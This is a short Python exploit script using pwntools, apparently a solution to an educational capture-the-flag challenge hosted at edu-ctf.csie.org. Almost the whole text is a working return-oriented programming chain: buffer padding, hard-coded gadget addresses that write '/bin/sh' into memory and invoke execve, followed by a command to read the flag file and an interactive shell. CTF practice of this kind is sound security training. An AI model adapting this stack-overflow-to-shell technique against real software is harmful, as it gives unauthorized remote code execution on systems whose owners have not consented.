'/ Return-Oriented Programming /'
from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('edu-ctf.csie.org', 10173)
#r = process('./rop')

pop_rax = 0x0000000000415714
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx_rsi = 0x000000000044beb9
mov_qptr_rdi_rsi = 0x000000000044709b
syscall = 0x000000000047b68f
bss = 0x006b6020

z = flat(
	'A' * 0x38,
	pop_rdi,
	bss,
	pop_rsi,
	'/bin/sh\0',
	mov_qptr_rdi_rsi,
	pop_rdx_rsi,
	0,
	0,
	pop_rax,
	59,
	syscall
)

r.sendlineafter(':D', z)
r.sendline('cat /home/`whoami`/flag')
r.interactive()

